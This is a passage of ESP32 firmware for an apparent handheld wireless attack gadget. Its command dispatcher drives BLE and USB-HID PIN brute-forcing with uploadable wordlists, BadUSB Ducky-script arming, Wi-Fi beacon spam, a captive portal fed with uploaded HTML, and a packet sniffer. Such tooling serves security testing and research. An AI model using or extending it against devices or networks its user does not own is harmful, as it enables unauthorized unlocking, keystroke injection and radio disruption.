        proto.sendResp(id, ok, ok ? "ble pin paused" : error.c_str());
    }

    else if (strcmp(cmd, "BLE_PIN_RESUME") == 0) {
        String error;
        bool ok = blePinBruteforce.resume(error);
        proto.sendResp(id, ok, ok ? "ble pin resumed" : error.c_str());
    }

    else if (strcmp(cmd, "BLE_PIN_STOP") == 0) {
        String error;
        bool ok = blePinBruteforce.stop(error);
        proto.sendResp(id, ok, ok ? "ble pin stopped" : error.c_str());
    }

    else if (strcmp(cmd, "BLE_PIN_NEXT") == 0) {
        String error;
        bool ok = blePinBruteforce.nextAttempt(error);
        proto.sendResp(id, ok, ok ? "ble pin skipped" : error.c_str());
    }

    else if (strcmp(cmd, "BLE_PIN_PREV") == 0) {
        String error;
        bool ok = blePinBruteforce.previousAttempt(error);
        proto.sendResp(id, ok, ok ? "ble pin moved back" : error.c_str());
    }

    else if (strcmp(cmd, "BLE_PIN_CLEAR") == 0) {
        bool clearWordlist = doc["args"]["wordlist"] | false;
        String error;
        bool ok = blePinBruteforce.clear(clearWordlist, error);
        proto.sendResp(id, ok, ok ? "ble pin cleared" : error.c_str());
    }

    else if (strcmp(cmd, "BLE_PIN_STATUS") == 0) {
        JsonDocument resp;
        resp["ok"] = true;
        blePinBruteforce.status(resp);
        String json;
        serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    else if (strcmp(cmd, "BLE_PIN_FORGET_BOND") == 0) {
        String error;
        bool ok = blePinBruteforce.forgetBond(error);
        proto.sendResp(id, ok, ok ? "ble pin bond cleared" : error.c_str());
    }

    else if (strcmp(cmd, "BLE_PIN_DISCONNECT") == 0) {
        String error;
        bool ok = blePinBruteforce.disconnectPeer(error);
        proto.sendResp(id, ok, ok ? "ble pin disconnect requested" : error.c_str());
    }

    else if (strcmp(cmd, "BLE_PIN_WORDLIST_RESET") == 0) {
        String error;
        bool ok = pinBruteforce.beginWordlistUpload(error);
        proto.sendResp(id, ok, ok ? "ble pin wordlist upload ready" : error.c_str());
    }

    else if (strcmp(cmd, "BLE_PIN_WORDLIST_CHUNK") == 0) {
        const char* b64data = doc["args"]["data"] | (const char*)nullptr;
        bool last = doc["args"]["last"] | false;
        uint32_t offset = doc["args"]["offset"] | 0;
        uint32_t checksum = doc["args"]["checksum"] | 0;
        if (!b64data) {
            proto.sendResp(id, false, "missing data");
            return;
        }
        size_t b64len = strlen(b64data);
        size_t outCap = ((b64len + 3) / 4) * 3 + 2;
        uint8_t* outBuf = (uint8_t*)heap_caps_malloc(outCap, MALLOC_CAP_8BIT);
        if (!outBuf) {
            proto.sendResp(id, false, "oom");
            return;
        }
        size_t outLen = 0;
        int ret = mbedtls_base64_decode(outBuf, outCap, &outLen,
                                        (const unsigned char*)b64data, b64len);
        String error;
        bool ok = false;
        if (ret == 0) {
            ok = pinBruteforce.addWordlistChunk(outBuf, outLen, offset, checksum, last, error);
        } else {
            error = "decode failed";
        }
        heap_caps_free(outBuf);
        proto.sendResp(id, ok, ok ? (last ? "ble pin wordlist saved" : "chunk ok") : error.c_str());
    }
    #endif

    else if (strcmp(cmd, "START_MSC") == 0) {
        #if defined(CONFIG_IDF_TARGET_ESP32S2) || defined(CONFIG_IDF_TARGET_ESP32S3)
            proto.sendResp(id, true, "rebooting into mass storage mode");
            delay(100);
            Preferences prefs;
            prefs.begin("boot", false);
            prefs.putBool("msc_mode", true);
            prefs.end();
            proto.sendResp(id, true, "rebooting into mass storage mode");
            delay(100);
            esp_restart();
        #else
            proto.sendResp(id, false, "mass storage not supported on this chip");
        #endif
    }
    
    else if (strcmp(cmd, "MSC_LIST") == 0) {
        #if MSC_SUPPORTED
            String listing;
            if (!MassStorage::listFiles(listing)) {
                proto.sendResp(id, false, "failed to list files");
            } else {
                uint64_t total = 0, used = 0, free = 0;
                MassStorage::getSpace(total, used, free);

                JsonDocument resp;
                resp["ok"] = true;

                // Parse "name\tsize\n..." into a files array so the client
                // doesn't have to do its own string parsing.
                JsonArray files = resp["files"].to<JsonArray>();
                int start = 0;
                while (start < listing.length()) {
                    int lineEnd = listing.indexOf('\n', start);
                    if (lineEnd == -1) break;
                    String line = listing.substring(start, lineEnd);
                    int tab = line.indexOf('\t');
                    if (tab != -1) {
                        JsonObject f = files.add<JsonObject>();
                        f["name"] = line.substring(0, tab);
                        f["size"] = line.substring(tab + 1).toInt();
                    }
                    start = lineEnd + 1;
                }

                resp["total"] = total;
                resp["used"]  = used;
                resp["free"]  = free;

                String json; serializeJson(resp, json);
                proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
            }
        #else
            proto.sendResp(id, false, "storage not supported on this chip");
        #endif
    }

    else if (strcmp(cmd, "MSC_READ") == 0) {
        #if MSC_SUPPORTED
            const char* path = doc["args"]["path"] | "";
            if (path[0] == '\0') {
                proto.sendResp(id, false, "missing path");
            } else {
                const bool chunked = !doc["args"]["offset"].isNull() ||
                                     !doc["args"]["length"].isNull() ||
                                     !doc["args"]["limit"].isNull();
                if (chunked) {
                    size_t offset = doc["args"]["offset"] | 0;
                    size_t limit  = doc["args"]["length"] | (doc["args"]["limit"] | 0);
                    if (limit == 0) limit = 512;
                    if (limit > 768) limit = 768;

                    String content;
                    size_t total = 0;
                    bool eof = false;
                    if (!MassStorage::readFileChunk(path, offset, limit, content, total, eof)) {
                        proto.sendResp(id, false, "failed to read file chunk");
                    } else {
                        JsonDocument resp;
                        resp["ok"]      = true;
                        resp["path"]    = path;
                        resp["content"] = content;
                        resp["size"]    = content.length();
                        resp["offset"]  = offset;
                        resp["total"]   = total;
                        resp["eof"]     = eof;
                        String json; serializeJson(resp, json);
                        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
                    }
                } else {
                    String content;
                    if (!MassStorage::readFile(path, content)) {
                        proto.sendResp(id, false, "failed to read file");
                    } else {
                        JsonDocument resp;
                        resp["ok"]      = true;
                        resp["path"]    = path;
                        resp["content"] = content;
                        resp["size"]    = content.length();
                        resp["offset"]  = 0;
                        resp["total"]   = content.length();
                        resp["eof"]     = true;
                        String json; serializeJson(resp, json);
                        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
                    }
                }
            }
        #else
            proto.sendResp(id, false, "storage not supported on this chip");
        #endif
    }

    else if (strcmp(cmd, "MSC_WRITE") == 0) {
        #if MSC_SUPPORTED
            const char* path    = doc["args"]["path"] | "";
            const char* content = doc["args"]["content"] | "";
            bool append         = doc["args"]["append"] | false;

            if (path[0] == '\0') {
                proto.sendResp(id, false, "missing path");
            } else if (!MassStorage::writeFile(path, String(content), append)) {
                proto.sendResp(id, false, "failed to write file");
            } else {
                proto.sendResp(id, true, append ? "appended" : "written");
            }
        #else
            proto.sendResp(id, false, "storage not supported on this chip");
        #endif
    }

    else if (strcmp(cmd, "MSC_DELETE") == 0) {
        #if MSC_SUPPORTED
            const char* path = doc["args"]["path"] | "";
            if (path[0] == '\0') {
                proto.sendResp(id, false, "missing path");
            } else if (!MassStorage::deleteFile(path)) {
                proto.sendResp(id, false, "failed to delete file");
            } else {
                proto.sendResp(id, true, "deleted");
            }
        #else
            proto.sendResp(id, false, "storage not supported on this chip");
        #endif
    }

    else if (strcmp(cmd, "MSC_SPACE") == 0) {
        #if MSC_SUPPORTED
            uint64_t total = 0, used = 0, free = 0;
            if (!MassStorage::getSpace(total, used, free)) {
                proto.sendResp(id, false, "failed to get space info");
            } else {
                JsonDocument resp;
                resp["ok"]    = true;
                resp["total"] = total;
                resp["used"]  = used;
                resp["free"]  = free;
                String json; serializeJson(resp, json);
                proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
            }
        #else
            proto.sendResp(id, false, "storage not supported on this chip");
        #endif
    }

    else if (strcmp(cmd, "MSC_SETUP") == 0) {
        #if MSC_SUPPORTED
            if (!MassStorage::setup()) {
                proto.sendResp(id, false, "failed to enter MSC mode");
            } else {
                proto.sendResp(id, true, "msc mode active");
            }
        #else
            proto.sendResp(id, false, "storage not supported on this chip");
        #endif
    }

    // File upload to mass storage
    else if (strcmp(cmd, "SET_FILE_CHUNK") == 0) {
        #if MSC_SUPPORTED
            const char* filename = doc["args"]["filename"] | (const char*)nullptr;
            const char* b64data  = doc["args"]["data"]     | (const char*)nullptr;
            bool last            = doc["args"]["last"]     | false;

            if (!filename || !b64data) {
                proto.sendResp(id, false, "missing filename or data");
                return;
            }

            size_t b64len = strlen(b64data);
            size_t outCap = ((b64len + 3) / 4) * 3 + 2;

            uint8_t* outBuf = (uint8_t*)heap_caps_malloc(outCap, MALLOC_CAP_8BIT);
            if (!outBuf) {
                proto.sendResp(id, false, "oom");
                return;
            }

            size_t outLen = 0;
            int ret = mbedtls_base64_decode(outBuf, outCap, &outLen,
                                            (const unsigned char*)b64data, b64len);
            if (ret == 0) {
                bool ok = FileUpload::addChunk(filename, outBuf, outLen, last);
                if (last) {
                    proto.sendResp(id, ok, ok ? "file written" : "write failed or rejected extension");
                } else {
                    proto.sendResp(id, ok, ok ? "chunk ok" : "rejected (bad extension?)");
                }
            } else {
                proto.sendResp(id, false, "decode failed");
            }

            heap_caps_free(outBuf);
        #else
            proto.sendResp(id, false, "storage not supported on this chip");
        #endif
    }

    else if (strcmp(cmd, "START_BADUSB") == 0) {
        #if HID_SUPPORTED
            // Native HID boot actions are mutually exclusive. Arming BadUSB
            // disarms any waiting PIN session without touching HID state.
            pinBruteforce.disarm();
            const char* filename = doc["args"]["filename"] | (const char*)nullptr;
            bool        startMSC = doc["args"]["msc"] | false;
            if (!filename) { proto.sendResp(id, false, "Ducky script is missing!"); return; }
            bool ok = UsbHID::armScript(filename, startMSC);
            proto.sendResp(id, ok, ok ? "Armed successfully" : "failed to arm");
            #if defined(CONFIG_IDF_TARGET_ESP32S2)
            digitalWrite(LED_PIN, HIGH);
            #endif
        #else
            proto.sendResp(id, false, "HID not supported on this chip");
        #endif
    }

    // ── PIN BRUTEFORCE ───────────────────────────────────────────────────
    else if (strcmp(cmd, "PIN_RANGE_START") == 0) {
        #if HID_SUPPORTED
            // Native HID boot actions are mutually exclusive. Arming PIN
            // disarms any waiting BadUSB script.
            UsbHID::disarm();
        #endif
        String error;
        if (!pinBruteforce.start(doc["args"], error)) {
            proto.sendResp(id, false, error.c_str());
            return;
        }
        JsonDocument resp;
        resp["ok"] = true;
        pinBruteforce.status(resp);
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    else if (strcmp(cmd, "PIN_RANGE_STOP") == 0) {
        pinBruteforce.stop();
        JsonDocument resp;
        resp["ok"] = true;
        pinBruteforce.status(resp);
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    else if (strcmp(cmd, "PIN_RANGE_CLEAR") == 0) {
        bool clearWordlist = doc["args"]["wordlist"] | false;
        String error;
        pinBruteforce.clear(clearWordlist, error);
        JsonDocument resp;
        resp["ok"] = true;
        pinBruteforce.status(resp);
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    else if (strcmp(cmd, "PIN_RANGE_STATUS") == 0) {
        JsonDocument resp;
        resp["ok"] = true;
        pinBruteforce.status(resp);
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    else if (strcmp(cmd, "PIN_WORDLIST_RESET") == 0) {
        String error;
        bool ok = pinBruteforce.beginWordlistUpload(error);
        proto.sendResp(id, ok, ok ? "wordlist upload ready" : error.c_str());
    }

    else if (strcmp(cmd, "PIN_WORDLIST_CHUNK") == 0) {
        const char* b64data = doc["args"]["data"] | (const char*)nullptr;
        bool last = doc["args"]["last"] | false;
        uint32_t offset = doc["args"]["offset"] | 0;
        uint32_t checksum = doc["args"]["checksum"] | 0;
        if (!b64data) {
            proto.sendResp(id, false, "missing data");
            return;
        }
        size_t b64len = strlen(b64data);
        size_t outCap = ((b64len + 3) / 4) * 3 + 2;
        uint8_t* outBuf = (uint8_t*)heap_caps_malloc(outCap, MALLOC_CAP_8BIT);
        if (!outBuf) {
            proto.sendResp(id, false, "oom");
            return;
        }
        size_t outLen = 0;
        int ret = mbedtls_base64_decode(outBuf, outCap, &outLen,
                                        (const unsigned char*)b64data, b64len);
        String error;
        bool ok = false;
        if (ret == 0) {
            ok = pinBruteforce.addWordlistChunk(outBuf, outLen, offset, checksum, last, error);
        } else {
            error = "decode failed";
        }
        heap_caps_free(outBuf);
        proto.sendResp(id, ok, ok ? (last ? "wordlist saved" : "chunk ok") : error.c_str());
    }

    // ── BEACON SPAM ───────────────────────────────────────────────────────
    else if (strcmp(cmd, "START_BEACON") == 0) {
        radioIdle();  // stop sniff / portal / prior beacon before starting

        const char* band = doc["args"]["band"] | "auto";
        WifiBandMode bandMode = WifiBandMode::BAND_2G;
        String bandError;
        if (!configureWifiBand(band, bandMode, bandError)) {
            proto.sendResp(id, false, bandError.c_str());
            return;
        }

        const char* ssidsRaw = doc["args"]["ssids"] | "";
        uint8_t  channel     = doc["args"]["channel"] | 1;
        if (!isValidWifiChannel(channel)) {
            proto.sendResp(id, false, "invalid channel");
            return;
        }
        String regulatoryError;
        if (!validateRegulatoryChannel(channel, regulatoryError)) {
            proto.sendResp(id, false, regulatoryError.c_str());
            return;
        }
        uint16_t intervalMs  = doc["args"]["interval_ms"] | 20;
        bool randomize       = doc["args"]["random_bssid"] | true;
        bool hidden          = doc["args"]["hidden"] | false;

        if (ssidsRaw[0] == '\0') {
            proto.sendResp(id, false, "missing ssids");
        } else if (!beacon.start(String(ssidsRaw), channel, intervalMs, randomize, hidden)) {
            proto.sendResp(id, false, "invalid channel or empty ssid list");
        } else {
            BeaconStats bs = beacon.stats();
            JsonDocument resp;
            resp["ok"]      = true;
            resp["ssids"]   = bs.ssids;
            resp["channel"] = bs.channel;
            String json; serializeJson(resp, json);
            proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
        }
    }

    else if (strcmp(cmd, "STOP_BEACON") == 0) {
        BeaconStats bs = beacon.stats();
        beacon.stop();
        JsonDocument resp;
        resp["ok"]   = true;
        resp["sent"] = bs.sent;
        resp["ssids"] = bs.ssids;
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    else if (strcmp(cmd, "BEACON_STATUS") == 0) {
        BeaconStats bs = beacon.stats();
        JsonDocument resp;
        resp["ok"]      = true;
        resp["active"]  = beacon.active();
        resp["ssids"]   = bs.ssids;
        resp["sent"]    = bs.sent;
        resp["channel"] = bs.channel;
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    else {
        proto.sendResp(id, false, "unknown command");
    }
}

void handleAck(uint32_t chunk_index) {
    sniffer.onAck(chunk_index);
}

void sendHeartbeat() {
    static uint32_t last = 0;
    if (millis() - last < 5000) return;
    last = millis();

    JsonDocument doc;
    doc["uptime"] = millis();
    doc["heap"]   = ESP.getFreeHeap();
    proto.sendEvent("heartbeat", doc);
}

// ── Setup ──────────────────────────────────────────────────────────────────
void setup() {
    #if CONFIG_IDF_TARGET_ESP32S2 || CONFIG_IDF_TARGET_ESP32S3
        Keyboard.begin();
        Preferences prefs;
        prefs.begin("boot", false);
        bool mscMode = prefs.getBool("msc_mode", false);

        if (mscMode) prefs.putBool("msc_mode", false);


        prefs.end();

        #if (MSC_SUPPORTED || HID_SUPPORTED)
        if (mscMode) {
            MassStorage::setup();   // USB.begin() called fresh, nothing else has touched USB yet
            while (true) delay(1000);
        } else if (UsbHID::runIfArmed()) {
            // BadUSB keeps priority for the native HID boot path.
            while (true) delay(1500);
        } else if (pinBruteforce.runIfArmed()) {
            // One-shot HID session, like BadUSB. Keep the device in HID mode
            // until the user unplugs/replugs it, then re-arm from the app.
            while (true) delay(1500);
        }
        #endif
    #endif

    Serial.setRxBufferSize(4096);
    Serial.begin(115200);
    delay(150);

    #if LD2450_BOOT_START
        // Devkit bring-up: UART2 defaults for classic ESP32 devkit.
        ld2450.begin(Serial1, LD2450_BAUD, LD2450_RX_PIN, LD2450_TX_PIN,
                     LD2450_BOOT_DEBUG);
    #endif

    #if defined(CONFIG_IDF_TARGET_ESP32S2)
        pinMode(LED_PIN, OUTPUT);
    #endif

    // ── ONE-TIME radio init: APSTA and nothing else ever again ──────────────
    // ★ FIXED: removed the redundant first AP config block.
    // The one and only WiFi.mode() call is right here.
    WiFi.mode(WIFI_MODE_APSTA);
    applyStoredWifiCountry();

    // Configure a minimal hidden AP so WIFI_IF_AP is always valid for TX.
    wifi_config_t ap_cfg = {};
    strcpy((char*)ap_cfg.ap.ssid, "nrcap32");
    ap_cfg.ap.ssid_len       = 7;
    ap_cfg.ap.ssid_hidden    = 1;
    ap_cfg.ap.max_connection = 0;
    ap_cfg.ap.channel        = 1;  // default, will be changed by deauth/portal
    esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);

    // Ensure promiscuous is OFF at boot
    esp_wifi_set_promiscuous(false);

    // Initialise subsystems
    proto.begin();
    proto.onCmd(handleCmd);
    proto.onAck(handleAck);

    proto.onHtml([](const uint8_t* data, size_t len) {
        if (len < 3) return;  // need at least seq(2) + isLast(1)

        uint16_t seq;
        memcpy(&seq, data, 2);
        bool isLast = data[2] != 0;
        const uint8_t* payload = data + 3;
        size_t payloadLen = len - 3;

        if (g_lastHtmlSeq != 0xFFFF && seq <= g_lastHtmlSeq) {
            // old or duplicate chunk — already applied, just re-ACK, don't reapply
        } else {
            portal.setHtmlChunk(payload, payloadLen, isLast);
            g_lastHtmlSeq = seq;
        }

        JsonDocument doc;
        doc["ok"]  = true;
        doc["seq"] = seq;
        String json;
        serializeJson(doc, json);
        proto.sendRaw(TYPE_RESP, 0, (const uint8_t*)json.c_str(), json.length());
    });


    sniffer.begin(proto);
    portal.begin(proto);
    beacon.begin(proto);
    deauthDetector.begin(proto);
    hiddenApDetector.begin(proto);
    mesh.begin(proto, getDeviceId().c_str(), CHIP_NAME);
    pinBruteforce.begin(proto);
    #ifdef ENABLE_BLE_HID
        bleScanner.begin(proto);
        bleProfile.begin(proto);
        blePinBruteforce.begin(proto);
    #endif

}

// ── Loop ───────────────────────────────────────────────────────────────────
void loop() {
    proto.update();
    sendHeartbeat();
    
    sniffer.processQueue();
    sniffer.handleHop();
    portal.update();
    beacon.update();
    deauthDetector.update();
    hiddenApDetector.update();
    mesh.update();
    pinBruteforce.update();
    #ifdef ENABLE_BLE_HID
        blePinBruteforce.update();
    #endif
    ld2450.update();
    emitLd2450Events();
    #ifdef ENABLE_BLE_HID
        bleScanner.update();
        bleProfile.update();
    #endif

    static uint32_t lastRefresh = 0;
    if (millis() - lastRefresh > 2500) {
        lastRefresh = millis();
        if (sniffer.active()) {
            // 
        }
    }
}